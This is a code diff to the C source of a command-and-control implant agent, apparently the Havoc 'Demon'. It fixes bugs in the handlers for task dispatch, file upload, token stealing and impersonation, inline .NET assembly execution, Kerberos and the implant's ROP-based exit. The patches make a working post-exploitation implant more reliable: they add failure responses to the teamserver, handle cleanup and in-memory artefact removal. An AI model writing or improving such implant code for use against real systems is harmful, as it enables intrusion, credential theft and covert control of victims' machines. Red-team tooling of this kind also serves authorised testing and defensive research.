@@ -112,10 +112,11 @@ VOID CommandDispatcher( VOID )
 
                 if ( CommandID != DEMON_COMMAND_NO_JOB ) {
                     PRINTF( "Task => RequestID:[%d : %x] CommandID:[%d : %x] TaskBuffer:[%x : %d]\n", RequestID, RequestID, CommandID, CommandID, TaskBuffer, TaskBufferSize )
+                    /* always start from a fresh parser so a zero-payload task
+                     * can't dispatch against the previous task's buffer */
+                    ParserDestroy( &TaskParser );
+                    ParserNew( &TaskParser, TaskBuffer, TaskBufferSize );
                     if ( TaskBufferSize != 0 ) {
-                        /* free the previous task parser buffer before re-creating it */
-                        ParserDestroy( &TaskParser );
-                        ParserNew( &TaskParser, TaskBuffer, TaskBufferSize );
                         ParserDecrypt( &TaskParser, Instance->Config.AES.Key, Instance->Config.AES.IV );
                     }
 
@@ -130,7 +131,7 @@ VOID CommandDispatcher( VOID )
                         }
                     }
                 }
-            } while ( Parser.Length > 12 );
+            } while ( Parser.Length >= 12 );
 
             MemSet( DataBuffer, 0, DataBufferSize );
             Instance->Win32.LocalFree( DataBuffer );
@@ -768,6 +769,12 @@ VOID CommandFS( PPARSER Parser )
                 {
                     PRINTF( "Failed to get current dir: %d\n", NtGetLastError() );
                     DATA_FREE( Path, ( MAX_PATH + 2 + 1 ) * sizeof( WCHAR ) );
+                    /* send a well-formed (empty) response the teamserver can
+                     * parse instead of a truncated packet */
+                    PackageAddBool( Package, FileExplorer );
+                    PackageAddBool( Package, ListOnly );
+                    PackageAddWString( Package, L"" );
+                    PackageAddBool( Package, FALSE );
                     break;
                 }
 
@@ -992,6 +999,9 @@ VOID CommandFS( PPARSER Parser )
 
             PackageAddInt32( Package, FileSize );
             PackageAddWString( Package, FileName );
+
+            /* upload completed: drop the buffered copy from memory */
+            RemoveMemFile( MemFileID );
 
         CleanupUpload:
             if ( hFile ) {
@@ -1505,11 +1515,24 @@ VOID CommandToken( PPARSER Parser )
             /* steal token */
             if ( ! ( StolenToken  = TokenSteal( TargetPid, TargetHandle ) ) ) {
                 PUTS( "[!] Couldn't get remote process token" )
+                /* transmit a failure response so the teamserver task completes */
+                PackageAddWString( Package, L"" );
+                PackageAddInt32( Package, 0 );
+                PackageAddInt32( Package, TargetPid );
+                PackageTransmit( Package );
                 return;
             }
 
             if ( ! TokenQueryOwner( StolenToken, &UserDomain, TOKEN_OWNER_FLAG_DEFAULT ) ) {
                 PUTS( "Failed to query user/domain from stolen token" )
+                /* the token was never added to the vault: close it and
+                 * transmit a failure response so the task completes */
+                SysNtClose( StolenToken );
+                DATA_FREE( UserDomain.Buffer, UserDomain.Length );
+                PackageAddWString( Package, L"" );
+                PackageAddInt32( Package, 0 );
+                PackageAddInt32( Package, TargetPid );
+                PackageTransmit( Package );
                 return;
             }
 
@@ -1520,6 +1543,12 @@ VOID CommandToken( PPARSER Parser )
             if ( ! ImpersonateTokenFromVault( NewTokenID ) )
             {
                 PUTS( "Failed to impersonate the token" )
+                /* NOTE: UserDomain.Buffer is owned by the vault entry now,
+                 * it must stay allocated */
+                PackageAddWString( Package, L"" );
+                PackageAddInt32( Package, NewTokenID );
+                PackageAddInt32( Package, TargetPid );
+                PackageTransmit( Package );
                 return;
             }
 
@@ -1874,6 +1903,9 @@ VOID CommandAssemblyInlineExecute( PPARSER Parser )
 
             DotnetClose();
         }
+
+        /* execution completed: drop the buffered assembly from memory */
+        RemoveMemFile( MemFileID );
 
         PUTS( "Finished with Assembly inline execute" )
     }
@@ -2341,7 +2373,7 @@ VOID CommandNet( PPARSER Parser )
                         if ( SessionInfo == NULL )
                             break;
 
-                        PackageAddWString( Package, SessionInfo[i].sesi10_username );
+                        PackageAddWString( Package, SessionInfo[i].sesi10_cname );
                         PackageAddWString( Package, SessionInfo[i].sesi10_username );
                         PackageAddInt32( Package, SessionInfo[i].sesi10_time );
                         PackageAddInt32( Package, SessionInfo[i].sesi10_idle_time );
@@ -3365,6 +3397,13 @@ VOID CommandKerberos(
         default: break;
     }
 
+    /* close the duplicated token handle on all paths */
+    if ( hToken )
+    {
+        SysNtClose( hToken );
+        hToken = NULL;
+    }
+
     PackageTransmit( Package );
 }
 
@@ -3625,11 +3664,13 @@ VOID CommandExit( PPARSER Parser )
     RopExit.R8  = U_PTR( &ImageSize );
     RopExit.R9  = U_PTR( MEM_RELEASE );
 
-    if ( ExitMethod == 1 )
-        *( ULONG_PTR volatile * ) ( RopExit.Rsp + ( sizeof( ULONG_PTR ) * 0x0 ) ) = U_PTR( Instance->Win32.RtlExitUserThread );
-
-    else if ( ExitMethod == 2 )
+    /* NOTE: any unexpected ExitMethod defaults to a thread exit so we never
+     * return into a torn down implant or continue with a missing return address */
+    if ( ExitMethod == 2 )
         *( ULONG_PTR volatile * ) ( RopExit.Rsp + ( sizeof( ULONG_PTR ) * 0x0 ) ) = U_PTR( Instance->Win32.RtlExitUserProcess );
+
+    else
+        *( ULONG_PTR volatile * ) ( RopExit.Rsp + ( sizeof( ULONG_PTR ) * 0x0 ) ) = U_PTR( Instance->Win32.RtlExitUserThread );
 
     RopExit.ContextFlags = CONTEXT_FULL;
     Instance->Win32.NtContinue( &RopExit, FALSE );
@@ -3638,11 +3679,11 @@ VOID CommandExit( PPARSER Parser )
 
     // TODO: cleanup memory
 
-    if ( ExitMethod == 1 )
-        Instance->Win32.RtlExitUserThread( STATUS_SUCCESS );
-
-    else if ( ExitMethod == 2 )
+    if ( ExitMethod == 2 )
         Instance->Win32.RtlExitUserProcess( STATUS_SUCCESS );
+
+    else
+        Instance->Win32.RtlExitUserThread( STATUS_SUCCESS );
 
 #endif
 }
